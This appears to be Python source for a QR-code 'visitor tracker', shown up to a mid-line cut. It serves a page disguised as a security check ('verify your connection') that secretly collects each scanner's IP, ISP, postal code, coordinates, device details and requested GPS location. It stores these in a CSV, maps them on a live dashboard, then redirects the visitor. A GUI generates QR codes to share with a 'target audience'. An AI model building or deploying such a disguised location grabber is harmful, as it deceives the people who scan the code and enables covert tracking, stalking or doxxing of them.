"""
QR Code Tracking System - Generate QR code, when scanned, get visitor's location, ISP, device info
"""

import os
import json
import csv
import socket
import threading
import webbrowser
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import qrcode
from PIL import Image, ImageTk
import io
import requests

CSV_FILE = "tracking_data.csv"

# HTML page that captures visitor data when QR code is scanned
TRACKING_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            backdrop-filter: blur(10px);
        }
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 4px solid white;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .info {
            font-size: 12px;
            margin-top: 20px;
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 Processing...</h2>
        <div class="spinner"></div>
        <p>Please wait while we verify your connection...</p>
        <div class="info">This helps us improve security</div>
    </div>

    <script>
        // Get redirect URL from URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const redirectUrl = urlParams.get('redirect') || 'https://www.google.com';
        
        async function collectData() {
            const data = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenSize: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || "Direct",
                url: window.location.href
            };
            
            // Get IP and location data from ipapi.co
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                data.ip = ipData.ip;
                data.city = ipData.city;
                data.region = ipData.region;
                data.country = ipData.country_name;
                data.country_code = ipData.country_code;
                data.postal = ipData.postal;
                data.latitude = ipData.latitude;
                data.longitude = ipData.longitude;
                data.isp = ipData.org;
                data.timezone_ip = ipData.timezone;
            } catch(e) {
                data.ip = "Unable to fetch";
                console.error("IP fetch error:", e);
            }
            
            // Try to get GPS location if available
            if ('geolocation' in navigator) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            timeout: 5000,
                            enableHighAccuracy: true
                        });
                    });
                    data.gps_latitude = position.coords.latitude;
                    data.gps_longitude = position.coords.longitude;
                    data.gps_accuracy = position.coords.accuracy;
                } catch(e) {
                    data.gps_error = e.message;
                }
            }
            
            // Send data to server
            fetch('/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(response => response.json())
              .then(result => {
                  if (result.success) {
                      document.body.innerHTML = `
                          <div class="container">
                              <h2>✅ Access Granted</h2>
                              <p>Thank you for your visit!</p>
                              <p style="font-size: 12px; margin-top: 20px;">Redirecting...</p>
                          </div>
                      `;
                      // Redirect after 3 seconds
                      setTimeout(() => {
                          window.location.href = redirectUrl;
                      }, 3000);
                  }
              });
        }
        
        collectData();
    </script>
</body>
</html>
"""

# Dashboard HTML to view tracking data
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Tracking Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            text-align: center;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .stat-card:hover {
            transform: translateY(-5px);
        }
        .stat-number {
            font-size: 32px;
            font-weight: bold;
            color: #667eea;
        }
        .stat-label {
            color: #666;
            margin-top: 5px;
        }
        .filters {
            background: white;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .filter-group {
            display: inline-block;
            margin-right: 15px;
        }
        select, input {
            padding: 5px 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 5px 15px;
            border-radius: 5px;
            cursor: pointer;
        }
        table {
            width: 100%;
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        th {
            background: #667eea;
            color: white;
            padding: 12px;
            text-align: left;
            cursor: pointer;
        }
        td {
            padding: 10px;
            border-bottom: 1px solid #eee;
        }
        tr:hover {
            background: #f5f5f5;
        }
        .map-link {
            color: #667eea;
            text-decoration: none;
        }
        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 5px;
            font-size: 11px;
            font-weight: bold;
        }
        .badge-mobile {
            background: #d4edda;
            color: #155724;
        }
        .badge-desktop {
            background: #d1ecf1;
            color: #0c5460;
        }
        .refresh-btn {
            float: right;
            background: #28a745;
            padding: 8px 20px;
        }
        .export-btn {
            float: right;
            background: #17a2b8;
            padding: 8px 20px;
            margin-right: 10px;
        }
        .clear-btn {
            float: right;
            background: #dc3545;
            padding: 8px 20px;
            margin-right: 10px;
        }
        .live-badge {
            background: #28a745;
            color: white;
            padding: 2px 8px;
            border-radius: 20px;
            font-size: 11px;
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📊 QR Code Tracking Dashboard</h1>
            <p>Real-time visitor tracking - <span class="live-badge">🔴 LIVE</span></p>
            <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
            <button class="export-btn" onclick="exportData()">💾 Export CSV</button>
            <button class="clear-btn" onclick="clearAll()">🗑 Clear All</button>
        </div>
        
        <div class="stats">
            <div class="stat-card" onclick="filterBy('all')">
                <div class="stat-number" id="totalVisits">0</div>
                <div class="stat-label">Total Visits</div>
            </div>
            <div class="stat-card" onclick="filterBy('unique')">
                <div class="stat-number" id="uniqueIPs">0</div>
                <div class="stat-label">Unique IPs</div>
            </div>
            <div class="stat-card" onclick="filterBy('country')">
                <div class="stat-number" id="uniqueCountries">0</div>
                <div class="stat-label">Countries</div>
            </div>
            <div class="stat-card" onclick="filterBy('mobile')">
                <div class="stat-number" id="mobileUsers">0</div>
                <div class="stat-label">Mobile Users</div>
            </div>
        </div>
        
        <div class="filters">
            <div class="filter-group">
                <label>Country:</label>
                <select id="countryFilter" onchange="filterData()">
                    <option value="">All</option>
                </select>
            </div>
            <div class="filter-group">
                <label>Device:</label>
                <select id="deviceFilter" onchange="filterData()">
                    <option value="">All</option>
                    <option value="mobile">Mobile</option>
                    <option value="desktop">Desktop</option>
                </select>
            </div>
            <div class="filter-group">
                <label>Search:</label>
                <input type="text" id="searchInput" placeholder="IP, ISP, or City..." onkeyup="filterData()">
            </div>
            <div class="filter-group">
                <label>Date:</label>
                <input type="date" id="dateFilter" onchange="filterData()">
            </div>
        </div>
        
        <div style="overflow-x: auto;">
            <table id="dataTable">
                <thead>
                    <tr>
                        <th onclick="sortTable(0)">Time ⬍</th>
                        <th onclick="sortTable(1)">IP Address</th>
                        <th onclick="sortTable(2)">Location</th>
                        <th onclick="sortTable(3)">Country</th>
                        <th onclick="sortTable(4)">ISP</th>
                        <th onclick="sortTable(5)">Device</th>
                        <th>Map</th>
                    </tr>
                </thead>
                <tbody id="tableBody">
                </tbody>
            </table>
        </div>
    </div>

    <script>
        let allData = [];
        let currentFilter = 'all';
        
        async function loadData() {
            const response = await fetch('/api/tracking-data');
            allData = await response.json();
            updateStats();
            populateFilters();
            displayData(allData);
        }
        
        function updateStats() {
            const uniqueIPs = new Set(allData.map(d => d.ip)).size;
            const uniqueCountries = new Set(allData.map(d => d.country)).size;
            const mobileUsers = allData.filter(d => d.userAgent && d.userAgent.includes('Mobile')).length;
            
            document.getElementById('totalVisits').innerHTML = allData.length;
            document.getElementById('uniqueIPs').innerHTML = uniqueIPs;
            document.getElementById('uniqueCountries').innerHTML = uniqueCountries;
            document.getElementById('mobileUsers').innerHTML = mobileUsers;
        }
        
        function populateFilters() {
            const countries = [...new Set(allData.map(d => d.country).filter(c => c))];
            const countrySelect = document.getElementById('countryFilter');
            countries.forEach(country => {
                const option = document.createElement('option');
                option.value = country;
                option.text = country;
                countrySelect.appendChild(option);
            });
        }
        
        function filterData() {
            const country = document.getElementById('countryFilter').value;
            const device = document.getElementById('deviceFilter').value;
            const search = document.getElementById('searchInput').value.toLowerCase();
            const date = document.getElementById('dateFilter').value;
            
            let filtered = allData;
            
            if (country) {
                filtered = filtered.filter(d => d.country === country);
            }
            if (device === 'mobile') {
                filtered = filtered.filter(d => d.userAgent && d.userAgent.includes('Mobile'));
            } else if (device === 'desktop') {
                filtered = filtered.filter(d => d.userAgent && !d.userAgent.includes('Mobile'));
            }
            if (search) {
                filtered = filtered.filter(d => 
                    (d.ip && d.ip.toLowerCase().includes(search)) ||
                    (d.isp && d.isp.toLowerCase().includes(search)) ||
                    (d.city && d.city.toLowerCase().includes(search))
                );
            }
            if (date) {
                filtered = filtered.filter(d => d.timestamp && d.timestamp.startsWith(date));
            }
            
            displayData(filtered);
        }
        
        function displayData(data) {
            const tbody = document.getElementById('tableBody');
            tbody.innerHTML = '';
            
            if (data.length === 0) {
                tbody.innerHTML = '<tr><td colspan="7" style="text-align: center;">No data found</td></tr>';
                return;
            }
            
            data.forEach(item => {
                const row = tbody.insertRow();
                const isMobile = item.userAgent && item.userAgent.includes('Mobile');
                const deviceType = isMobile ? '<span class="badge badge-mobile">📱 Mobile</span>' : '<span class="badge badge-desktop">💻 Desktop</span>';
                const time = new Date(item.timestamp).toLocaleString();
                
                row.innerHTML = `
                    <td>${time}</td>
                    <td><strong>${item.ip || 'N/A'}</strong></td>
                    <td>${item.city || 'N/A'}, ${item.region || ''}</td>
                    <td>${item.country || 'N/A'} ${item.country_code ? `(${item.country_code})` : ''}</td>
                    <td><small>${item.isp || 'N/A'}</small></td>
                    <td>${deviceType}</td>
                    <td>
                        ${item.latitude && item.longitude ? 
                            `<a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="map-link">📍 View Map</a>` : 
                            item.gps_latitude ? 
                            `<a href="https://www.google.com/maps?q=${item.gps_latitude},${item.gps_longitude}" target="_blank" class="map-link">📍 GPS</a>` : 
                            '—'
                        }
                    </td>
                `;
            });
        }
        
        function sortTable(column) {
            const headers = ['timestamp', 'ip', 'city', 'country', 'isp', 'userAgent'];
            allData.sort((a, b) => {
                let valA = a[headers[column]] || '';
                let valB = b[headers[column]] || '';
                if (column === 0) valA = new Date(valA), valB = new Date(valB);
                return valA > valB ? 1 : -1;
            });
            displayData(allData);
        }
        
        function filterBy(type) {
            currentFilter = type;
            if (type === 'unique') {
                const uniqueIPs = [...new Set(allData.map(d => d.ip))];
                displayData(allData.filter(d => uniqueIPs.includes(d.ip)));
            } else if (type === 'mobile') {
                displayData(allData.filter(d => d.userAgent && d.userAgent.includes('Mobile')));
            } else {
                displayData(allData);
            }
        }
        
        function exportData() {
            window.location.href = '/export-csv';
        }
        
        function clearAll() {
            if (confirm('⚠️ WARNING: This will delete ALL tracking data! Are you sure?')) {
                fetch('/clear-data', { method: 'POST' })
                    .then(() => location.reload());
            }
        }
        
        loadData();
        setInterval(loadData, 5000);
    </script>
</body>
</html>
"""

class TrackingHandler(BaseHTTPRequestHandler):
    """HTTP handler for tracking system"""
    
    def do_GET(self):
        # Parse the path and query parameters
        parsed_path = urllib.parse.urlparse(self.path)
        path = parsed_path.path
        query_params = urllib.parse.parse_qs(parsed_path.query)
        
        if path == '/' or path == '/index.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(TRACKING_PAGE.encode('utf-8'))
        
        elif path == '/dashboard':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(DASHBOARD_HTML.encode('utf-8'))
        
        elif path == '/api/tracking-data':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            data = []
            if os.path.exists(CSV_FILE):
                with open(CSV_FILE, 'r', encoding='utf-8') as f:
                    reader = csv.DictReader(f)
                    data = list(reader)
            
            self.wfile.write(json.dumps(data).encode('utf-8'))
        
        elif path == '/export-csv':
            if os.path.exists(CSV_FILE):
                self.send_response(200)
                self.send_header('Content-type', 'text/csv')
                self.send_header('Content-Disposition', f'attachment; filename=tracking_data_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv')
                self.end_headers()
                with open(CSV_FILE, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'No data available')
        
        elif path == '/qr-code':
            self.send_response(200)
            self.send_header('Content-type', 'image/png')
            self.end_headers()
            
            # Get QR code parameter
            campaign = query_params.get('campaign', ['default'])[0]
            redirect = query_params.get('redirect', ['https://www.google.com'])[0]
            
            # Generate QR code with both campaign and redirect parameters
            tracking_url = f"http://{self.server.server_name}:{self.server.server_port}/?campaign={campaign}&redirect={redirect}"
            qr = qrcode.QRCode(version=1, box_size=10, border=4)
            qr.add_data(tracking_url)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            
            # Save to bytes
            img_bytes = io.BytesIO()
            img.save(img_bytes, format='PNG')
            self.wfile.write(img_bytes.getvalue())
        
        else:
            # For any other path, serve the tracking page (redirect to root)
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/track':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # Save tracking data
            file_exists = os.path.exists(CSV_FILE)
            with open(CSV_FILE, 'a', newline='', encoding='utf-8') as f:
                fieldnames = ['timestamp', 'ip', 'city', 'region', 'country', 'country_code', 
                              'postal', 'latitude', 'longitude', 'isp', 'timezone_ip', 'gps_latitude', 
                              'gps_longitude', 'gps_accuracy', 'userAgent', 'platform', 'language', 
                              'screenSize', 'timezone', 'referrer', 'url']
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                if not file_exists:
                    writer.writeheader()
                
                # Prepare row with all fields
                row = {field: data.get(field, 'N/A') for field in fieldnames}
                writer.writerow(row)
            
            # Print to console
            print(f"\n{'='*60}")
            print(f"📍 NEW VISITOR TRACKED!")
            print(f"{'='*60}")
            print(f"⏰ Time: {data.get('timestamp', 'N/A')}")
            print(f"🌐 IP: {data.get('ip', 'N/A')}")
            print(f"📍 Location: {data.get('city', 'N/A')}, {data.get('country', 'N/A')}")
            print(f"🏢 ISP: {data.get('isp', 'N/A')}")
            print(f"📱 Device: {'Mobile' if 'Mobile' in data.get('userAgent', '') else 'Desktop'}")
            print(f"🌍 Coordinates: {data.get('latitude', 'N/A')}, {data.get('longitude', 'N/A')}")
            print(f"{'='*60}\n")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'success': True}).encode('utf-8'))
        
        elif self.path == '/clear-data':
            if os.path.exists(CSV_FILE):
                os.remove(CSV_FILE)
                # Recreate with header
                with open(CSV_FILE, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(['timestamp', 'ip', 'city', 'region', 'country', 'country_code', 
                                    'postal', 'latitude', 'longitude', 'isp', 'timezone_ip', 'gps_latitude', 
                                    'gps_longitude', 'gps_accuracy', 'userAgent', 'platform', 'language', 
                                    'screenSize', 'timezone', 'referrer', 'url'])
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'success': True}).encode('utf-8'))
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

class QRCodeTrackerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("QR Code Tracker - Get Visitor Info")
        self.root.geometry("1200x700")
        self.root.configure(bg='#1e1e2e')
        
        self.setup_ui()
        self.start_server()
    
    def setup_ui(self):
        # Title
        title_frame = tk.Frame(self.root, bg='#667eea', height=80)
        title_frame.pack(fill='x')
        title_frame.pack_propagate(False)
        
        title = tk.Label(title_frame, text="QR Code Visitor Tracker", 
                        font=('Arial', 24, 'bold'), bg='#667eea', fg='white')
        title.pack(expand=True)
        
        # Main content with tabs
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Tab 1: Generate QR Code
        self.generate_frame = tk.Frame(notebook, bg='white')
        notebook.add(self.generate_frame, text="🔨 Generate QR Code")
        self.setup_generate_tab()
        
        # Tab 2: Live Statistics
        self.stats_frame = tk.Frame(notebook, bg='white')
        notebook.add(self.stats_frame, text="📊 Live Statistics")
        self.setup_stats_tab()
        
        # Tab 3: Web Dashboard
        web_frame = tk.Frame(notebook, bg='white')
        notebook.add(web_frame, text="🌐 Web Dashboard")
        self.setup_web_tab(web_frame)
    
    def setup_generate_tab(self):
        # Campaign name
        tk.Label(self.generate_frame, text="Campaign Name (Optional):", 
                font=('Arial', 12), bg='white').pack(pady=10)
        self.campaign_entry = tk.Entry(self.generate_frame, font=('Arial', 12), width=40)
        self.campaign_entry.pack(pady=5)
        self.campaign_entry.insert(0, "my_campaign")
        
        # Redirect URL
        tk.Label(self.generate_frame, text="Redirect URL After Scan (Optional):", 
                font=('Arial', 12), bg='white').pack(pady=10)
        self.redirect_entry = tk.Entry(self.generate_frame, font=('Arial', 12), width=50)
        self.redirect_entry.pack(pady=5)
        self.redirect_entry.insert(0, "https://www.google.com")
        
        # Generate button
        generate_btn = tk.Button(self.generate_frame, text="✨ Generate Tracking QR Code", 
                                command=self.generate_qr_code,
                                bg='#667eea', fg='white', font=('Arial', 14, 'bold'),
                                padx=30, pady=15, cursor='hand2')
        generate_btn.pack(pady=20)
        
        # QR Code display
        self.qr_label = tk.Label(self.generate_frame, bg='white', relief=tk.SUNKEN, bd=2)
        self.qr_label.pack(pady=10, padx=20)
        
        # Info text
        info_text = """
        📌 HOW THIS WORKS:
        
        1. Click "Generate Tracking QR Code" above
        2. Save the QR code image
        3. Share it anywhere (website, poster, email, etc.)
        4. When someone scans it with their phone:
           • Their location (city, country) is captured
           • Their IP address and ISP are recorded
           • Their device type (mobile/desktop) is detected
           • GPS coordinates (if they allow)
           • Date and time of scan
        5. View all collected data in the "Live Statistics" tab
        6. Watch the web dashboard at http://localhost:5000/dashboard
        
        ⚠️ PRIVACY NOTE: Use this tool responsibly and in compliance with privacy laws.
        """
        
        info_label = tk.Label(self.generate_frame, text=info_text, 
                              font=('Courier', 10), bg='#f8f9fa', 
                              justify=tk.LEFT, padx=20, pady=20)
        info_label.pack(pady=20, fill='both', expand=True)
    
    def setup_stats_tab(self):
        # Stats display
        self.stats_text = scrolledtext.ScrolledText(self.stats_frame, font=('Courier', 10),
                                                     bg='#1e1e2e', fg='#00ff00',
                                                     wrap=tk.WORD)
        self.stats_text.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Buttons frame
        btn_frame = tk.Frame(self.stats_frame, bg='white')
        btn_frame.pack(pady=10)
        
        refresh_btn = tk.Button(btn_frame, text="🔄 Refresh Statistics", 
                               command=self.refresh_stats,
                               bg='#28a745', fg='white', font=('Arial', 10, 'bold'),
                               padx=15, pady=5, cursor='hand2')
        refresh_btn.pack(side=tk.LEFT, padx=5)
        
        clear_btn = tk.Button(btn_frame, text="🗑 Clear All Data", 
                             command=self.clear_all_data,
                             bg='#dc3545', fg='white', font=('Arial', 10, 'bold'),
                             padx=15, pady=5, cursor='hand2')
        clear_btn.pack(side=tk.LEFT, padx=5)
        
        # Auto-refresh
        self.refresh_stats()
        self.auto_refresh()
    
    def auto_refresh(self):
        self.refresh_stats()
        self.root.after(5000, self.auto_refresh)
    
    def setup_web_tab(self, parent):
        # Get local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            local_ip = "localhost"
        
        info_text = f"""
        🌐 WEB DASHBOARD ACCESS
        
        Open these URLs in your web browser:
        
        📍 TRACKING PAGE:    http://{local_ip}:5000/
        📊 DASHBOARD:        http://{local_ip}:5000/dashboard
        
        FEATURES:
        • Real-time visitor tracking
        • Live location mapping
        • Device detection
        • Export data to CSV
        • Filter by country/device
        • Auto-refresh every 5 seconds
        • View GPS coordinates on map
        
        🚀 HOW TO USE:
        1. Generate a QR code in the first tab
        2. Share it with your target audience
        3. Watch as visitor data appears in real-time!
        
        📱 Access from other devices on same network:
           http://{local_ip}:5000
        """
        
        info_label = tk.Label(parent, text=info_text, font=('Courier', 11), 
                              bg='#f8f9fa', justify=tk.LEFT, padx=20, pady=20)
        info_label.pack(fill='both', expand=True, padx=20, pady=20)
        
        # Open browser buttons
        btn_frame = tk.Frame(parent, bg='white')
        btn_frame.pack(pady=20)
        
        def open_tracking():
            webbrowser.open(f'http://{local_ip}:5000/')
        
        def open_dashboard():
            webbrowser.open(f'http://{local_ip}:5000/dashboard')
        
        tracking_btn = tk.Button(btn_frame, text="Open Tracking Page", 
                                command=open_tracking,
                                bg='#667eea', fg='white', font=('Arial', 11, 'bold'),
                                padx=20, pady=8, cursor='hand2')
        tracking_btn.pack(side=tk.LEFT, padx=10)
        
        dashboard_btn = tk.Button(btn_frame, text="Open Dashboard", 
                                 command=open_dashboard,
                                 bg='#764ba2', fg='white', font=('Arial', 11, 'bold'),
                                 padx=20, pady=8, cursor='hand2')
        dashboard_btn.pack(side=tk.LEFT, padx=10)
    
    def generate_qr_code(self):
        campaign = self.campaign_entry.get().strip()
        redirect = self.redirect_entry.get().strip()
        
        if not campaign:
            campaign = "default"
        
        if not redirect:
            redirect = "https://www.google.com"
        
        # Get local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            local_ip = "localhost"
        
        # Create tracking URL with redirect
        tracking_url = f"http://{local_ip}:5000/?campaign={campaign}&redirect={redirect}"
        
        # Generate QR code
        qr = qrcode.QRCode(version=1, box_size=10, border=4)
        qr.add_data(tracking_url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        
        # Save to file
        filename = f"tracking_qr_{campaign}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        img.save(filename)
        
        # Display in GUI
        img_resized = img.resize((250, 250), Image.Resampling.LANCZOS)
        photo = ImageTk.PhotoImage(img_resized)
        self.qr_label.config(image=photo)
        self.qr_label.image = photo
        
        # Show success message
        messagebox.showinfo("QR Code Generated!", 
                           f"✅ QR Code saved as: {filename}\n\n"
                           f"📱 Tracking URL: {tracking_url}\n\n"
                           f"When someone scans this QR code:\n"
                           f"• Their location will be captured\n"
                           f"• Their IP and ISP will be recorded\n"
                           f"• Their device info will be saved\n"
                           f"• They will be redirected to: {redirect}\n\n"
                           f"📊 View data in the 'Live Statistics' tab or web dashboard!")
        
        print(f"\n✅ QR Code Generated: {filename}")
        print(f"   Tracking URL: {tracking_url}")
        print(f"   Share this QR code to start collecting visitor data!\n")
    
    def refresh_stats(self):
        self.stats_text.delete(1.0, tk.END)
        
        if not os.path.exists(CSV_FILE):
            self.stats_text.insert(tk.END, "No visitors yet.\n\nGenerate a QR code and share it - when someone scans it, their data will appear here!")
            return
        
        with open(CSV_FILE, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            data = list(reader)
        
        if not data:
            self.stats_text.insert(tk.END, "No visitors yet.\n\nGenerate a QR code and share it - when someone scans it, their data will appear here!")
            return
        
        # Calculate statistics
        unique_ips = set()
        countries = set()
        cities = set()
        isps = set()
        mobile = 0
        
        for row in data:
            if row.get('ip'):
                unique_ips.add(row['ip'])
            if row.get('country'):
                countries.add
